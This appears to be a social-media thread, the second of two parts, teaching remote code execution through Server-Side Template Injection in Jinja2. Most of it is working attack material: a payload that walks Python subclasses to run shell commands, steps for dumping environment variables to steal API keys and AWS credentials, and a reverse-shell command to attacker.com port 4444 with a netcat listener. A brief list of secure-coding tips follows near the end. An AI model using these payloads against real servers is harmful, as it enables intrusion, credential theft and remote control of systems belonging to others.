![Advanced RCE Techniques2](https://github.com/user-attachments/assets/007c0c51-d284-450c-bce9-152b52bc3c6a)

# 🚨 Advanced RCE Techniques via File Extensions, PHP Uploads & SSTI [Part 2/2]

## 💥 [Part 2] From SSTI to Full Shell Access

In Part 1, we weaponized file extensions and PHP uploads. Today, we’re digging into Server-Side Template Injection (SSTI) — one of the most powerful RCE paths when template engines aren’t sandboxed.

### [1/20] 🧩 What is SSTI?

SSTI occurs when a template engine renders unsanitized user input, allowing attackers to inject code.

Popular engines often affected:

- Jinja2 (Python)
- Twig (PHP)
- Freemarker (Java)
- Velocity (Java)

### [2/20] 🧪 Target Scenario

The web app lets users customize email templates:

```html
"Hello {{ http://customer.name }}"
```

Now imagine we can inject that value — what happens if we put code inside the double braces?

### [3/20] 🔢 Initial Payload – Logic Execution Test

We send:

```jinja
{{ 7*7 }}
```

If the output is:

```text
Hello 49
```

✅ The app is vulnerable — it parsed your math expression. Let’s move to RCE.

### [4/20] 🔍 Under the Hood: Jinja2 Exploitation

With Jinja2, you can:

- Traverse Python object classes
- Access __builtins__
- Import os, run system commands

This is how we get from simple math to shell access.

### [5/20] 🔥 Full Payload: RCE via Subclass Traversal

```jinja
{% for x in ().__class__.__base__.__subclasses__() %}
{% if 'warning' in x.__name__ %}
{{ x()._module.__builtins__['__import__']('os').popen('whoami').read() }}
{% endif %}
{% endfor %}
```

☠️ This finds warnings.catch_warnings, uses it to access __builtins__, then runs shell commands.

### [6/20] 🧨 Live Output from Payload

If you’re successful, the server renders:

```text
Hello Hacker
www-data
```

Boom. SSTI escalated to RCE. You’re inside.

### [7/20] 🔐 Post-Exploitation Tactics

With os.popen() or subprocess.Popen, you can now:

#### Dump environment variables:
```python
os.environ
```

Extract API keys, AWS credentials, tokens.

#### Read config files:
```python
os.popen('cat settings.py').read()
```

### [8/20] 🛠️ Reverse Shell via SSTI

Want a shell? Inject:

```bash
os.popen("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'")
```

Set up a listener on your machine:

```bash
nc -lvnp 4444
```

🎯 Shell drops instantly.

### [9/20] ⚠️ Root Causes Summary

Why do these RCEs exist?

- Using pathinfo() without sanitization
- Accepting dangerous file extensions
- Rendering unsanitized user input in templates
- No separation of logic and content

### [10/20] 🛡️ Secure Coding Tips

#### 📌 For command injection:
- Sanitize user input
- Avoid shell_exec entirely
- Use safe wrappers (e.g., FFmpeg bindings)

#### 📌 For uploads:
- Rename + sanitize filenames
- Restrict file types and MIME
- Never allow execution in upload dirs

#### 📌 For SSTI:
- Use StrictUndefined in Jinja2
- Treat template data as untrusted
- Separate template logic from user data

## 💡 Key Takeaway

Every RCE vector started by trusting user input.

Whether it’s:

- A filename
- An uploaded image
- A rendered template

Ask yourself:

🔎 “Where does this data go? Can it reach the shell, interpreter, or engine?”

That’s where the exploit lives.

💥 These are real-world issues, not just CTF trivia. I’ve exploited these in:

- Laravel + PHP monoliths
- Flask/Django CRMs
- Legacy admin dashboards

And attackers are using them in the wild — right now.

---

🧠 Build labs. Detect patterns. Harden your stack.

🎯 Master RCE and take your red teaming to the next level.

---

💬 Share this thread, tag your hacker friends, and let me know what technique surprised you most!

---

📢 Join [@cybersecplayground](https://t.me/cybersecplayground) for elite PoCs, payload drops, red team tactics, and more.

#RCE #SSTI #CyberSecurity #BugBounty #CTF #Exploit #Jinja2 #TemplateInjection #ReverseShell #WebSecurity
